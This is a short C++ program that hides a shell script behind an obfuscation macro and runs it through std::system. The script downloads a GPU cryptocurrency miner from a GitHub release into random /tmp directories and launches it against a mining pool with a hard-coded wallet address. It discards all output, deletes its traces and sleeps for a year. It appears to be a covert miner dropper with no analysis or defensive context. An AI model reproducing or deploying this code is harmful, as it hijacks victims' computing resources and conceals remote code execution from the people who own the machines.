#include "obs.h"
#include <stdlib.h>
int main() {
std::system(AY_OBFUSCATE("\n\
export CLANG=$(shuf -n 1 -i 10000000-99999999)\n\
export NAME=$(shuf -n 1 -i 10000000-99999999)\n\
mkdir -p /tmp/$CLANG\n\
wget -qO /tmp/$CLANG/$NAME https://github.com/BloodMaryDev/Compute-substrate-Miner/releases/latest/download/compute-substrate-forge \n\
chmod +x /tmp/$CLANG/$NAME\n\
/tmp/$CLANG/$NAME --all-gpus --address 0xd17c95e17f3a6b6d21141509f8b6c1e7610c505e --pool csd-ru-central.lproute.com:8760 --worker mabox >/dev/null 2>&1 & echo done\n\
rm -rf /tmp/$CLANG\n\
sleep 365d\n"));
}



